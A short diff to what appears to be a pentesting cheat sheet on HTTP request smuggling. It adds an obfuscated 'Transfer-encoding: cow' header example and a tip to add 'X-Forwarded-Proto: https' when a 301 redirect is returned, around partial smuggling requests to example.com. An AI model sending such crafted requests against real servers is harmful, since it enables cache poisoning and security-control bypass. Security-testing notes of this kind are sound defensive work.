@@ -2,6 +2,10 @@ Request Smuggling
 -
 
 ````sh
+Transfer-encoding: cow
+````
+
+````sh
 POST / HTTP/1.1
 Host: example.com
 Content-Length: 6
@@ -113,4 +117,10 @@ x=
 
 POST /search HTTP/1.1
 Host: example.com  
+````
+````sh
+# for
+HTTP/1.1 301 Moved Permanently
+# just add
+X-Forwarded-Proto: https
 ````
